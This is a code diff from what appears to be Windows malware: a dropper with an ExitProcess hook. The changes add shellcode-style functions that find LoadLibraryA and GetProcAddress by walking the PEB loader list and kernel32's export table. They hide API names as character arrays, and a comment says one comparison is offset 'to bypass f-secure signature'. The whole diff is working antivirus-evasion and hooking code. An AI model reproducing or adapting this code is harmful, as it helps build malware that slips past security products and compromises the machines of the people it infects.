@@ -922,21 +922,30 @@ lbl_ref1:
 	char * dlls = (char *) (((char*)header) + header->dlls.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
+
+	LOADLIBRARY    pfn_LoadLibrary	   = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress  = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
+	char strExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
 	
-	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
+	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) pfn_GetProcAddress(hMod, strExitProcess);
 	
+	//ntdll 
+	char strNTDll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
+	char strRtlExitUserProcess[] = { 'R', 't', 'l', 'E', 'x', 'i', 't', 'U', 's', 'e', 'r', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
+	hMod = pfn_LoadLibrary(strNTDll);
+	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) pfn_GetProcAddress(hMod, strRtlExitUserProcess);
+
 	while (header->synchro != 1)
-		pfn_Sleep(HOOKSLEEPTIME);
-	
-	MESSAGE(STRING(STRIDX_VECTORQUIT));
-	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) dll_calls[CALL_RTLEXITUSERPROCESS];
-	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];
+		pfn_Sleep(100);
 
 	if (pfn_OriginalRtlExitUserProcess)
 		pfn_OriginalRtlExitUserProcess(uExitCode);
-	else // for <= xp sp3
+	else
 		pfn_OriginalExitProcess(uExitCode);
 }
 FUNCTION_END(ExitProcessHook);
@@ -1317,3 +1326,167 @@ bool dumpDropperFiles()
 
 	return true;
 }
+
+__forceinline GETPROCADDRESS resolveGetProcAddress()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
+
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strGetProcAddress, name))
+							return (GETPROCADDRESS)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
+}
+
+__forceinline LOADLIBRARY resolveLoadLibrary()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
+
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strLoadLibraryA, name))
+							return (LOADLIBRARY)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
+}
+
+
+
+
